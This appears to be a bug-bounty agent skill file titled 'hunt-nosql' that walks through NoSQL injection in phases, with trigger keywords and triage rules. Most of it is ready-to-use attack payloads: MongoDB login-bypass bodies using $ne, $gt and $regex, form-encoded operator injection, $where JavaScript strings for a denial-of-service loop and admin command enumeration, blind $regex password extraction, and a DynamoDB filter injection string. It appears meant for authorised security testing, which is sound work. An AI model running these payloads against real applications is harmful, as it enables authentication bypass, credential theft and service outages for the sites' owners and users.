---
name: hunt-nosql
description: NoSQL injection — Mongo operator injection, $where eval, $regex enum, DynamoDB filter abuse.
keywords: [nosql injection, mongo injection, $where, $regex, $ne, $gt, couchdb, dynamodb]
---

# hunt-nosql

## Triggers

"nosql", "mongo", "mongoose", "couchdb", "dynamodb", `$where`,
`$regex`, `$ne`.

## Phase 1 — fingerprint

Detect Mongo via:
- Driver errors: `MongoError`, `BSONError`
- ObjectId in URLs: 24-hex-char strings
- Mongoose schema errors leak field names

## Phase 2 — operator injection (Mongo)

Login bypass (JSON body):

```json
{"username":"admin","password":{"$ne":"x"}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":"admin","password":{"$regex":"^.{0,}$"}}
```

If app builds the query as `db.users.findOne({username, password})`,
the `$ne` operator matches any value except `x`.

Form-encoded:

```
username=admin&password[$ne]=x
```

Express + body-parser default → builds nested object.

## Phase 3 — `$where` eval

Some app code uses `$where: "this.x === '" + input + "'"` — full
JavaScript eval inside Mongo. RCE in Mongo process (limited
sandbox).

```
'; while(1){}; '       (DoS)
'; return tojson(db.adminCommand({listCollections:1})); '
```

## Phase 4 — boolean inference via `$regex`

When app returns "logged in" / "not logged in" only:

```json
{"username":"admin","password":{"$regex":"^a"}}     (true)
{"username":"admin","password":{"$regex":"^b"}}     (false)
```

Binary-search character by character.

## Phase 5 — DynamoDB

Query strings often built as:

```js
new QueryCommand({ FilterExpression: "x = :v", ExpressionAttributeValues: {":v": input}})
```

If app uses `FilterExpression: \`x = '${input}'\`` (string concat),
attacker injects `' OR attribute_exists(adminFlag) -- `.

Less common but appears in lambda code.

## Phase 6 — CouchDB / Elasticsearch

- CouchDB: `_temp_view` accepts raw JS map function — auth-gated
  RCE inside CouchDB if exposed
- Elasticsearch: `script_score` with Painless (sandboxed but
  bypassable in older versions)

## Disclosed-report patterns

| Source | Pattern |
|---|---|
| H1 #1095293 | Mongo `$where` eval in admin search |
| CVE-2017-12635 (CouchDB) | Privilege escalation via JSON |
| H1 #1130828 (HackerOne) | Blind SQLi via GraphQL — same mental pattern as nosql |
| 2023 various | Express + body-parser operator injection |

## Never-submit fallbacks

- Mongo operator injection that returns nothing useful → CHAIN REQUIRED
- $where eval inside an admin-only API → DOWNGRADE

## See also

- `hunt-sqli` — sibling
- `hunt-graphql` — common front-end
- `hunt-auth` — login-bypass impact
